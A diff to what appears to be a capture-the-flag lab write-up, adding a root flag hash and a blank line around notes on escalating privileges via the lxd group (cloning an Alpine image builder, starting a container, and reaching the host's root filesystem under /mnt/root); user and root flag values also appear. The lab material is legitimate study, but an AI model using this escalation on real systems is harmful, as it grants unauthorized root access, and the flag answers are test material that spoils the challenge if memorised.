@@ -188,6 +188,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ## user.txt: ```6fa6a321e52d85d0e61cc853c16e35cc```
 
 ## Found that ash user is in the ```lxd``` group, so easy privesc:
+
 ```bash
 git clone  https://github.com/saghul/lxd-alpine-builder.git
 cd lxd-alpine-builder
@@ -200,6 +201,8 @@ lxc start miao
 lxc exec miao /bin/sh
 # go to /mnt/root for root filesystem folder
 ```
+
+## root.txt: ```7d248a3ba5dd9609a8d7704420fa8286```
 
 
 
